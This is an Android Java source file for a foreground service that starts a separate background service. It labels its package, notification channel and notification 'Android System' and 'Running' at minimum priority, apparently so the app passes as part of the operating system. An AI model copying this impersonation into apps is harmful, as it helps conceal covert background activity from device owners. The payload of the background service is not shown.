package com.android.systemnotification.utils;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import com.android.systemnotification.R;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class ForegroundService extends Service {
    private final String TAG = ForegroundService.class.getSimpleName();

    public ForegroundService() {

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate()");

        startForeground(1, getNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand()");

        Intent intent1 = new Intent(this, BackgroundService.class);
        startService(intent1);

        return Service.START_NOT_STICKY;
        //Returning START_STICKY causes code to stick around when app activity has died.
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy()");
        super.onDestroy();

    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.e(TAG, "END");
    }

    private Notification getNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel = new NotificationChannel(
                    "com.android.systemnotification.fgservice",
                    "Android System",
                    NotificationManager.IMPORTANCE_LOW
            );

            final NotificationManager notificationManager =
                    (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);

            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }

        return new NotificationCompat.Builder(getApplicationContext(), "com.android.systemnotification.fgservice")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setOngoing(false)
                .setPriority(Notification.PRIORITY_MIN)
                .setAutoCancel(true)//persistent notification!
                .setChannelId("com.android.systemnotification.fgservice")
                .setContentTitle("Android System")   //Title message top row.
                .setContentText("Running")  //message when looking at the notification, second row
                .build();
    }
}
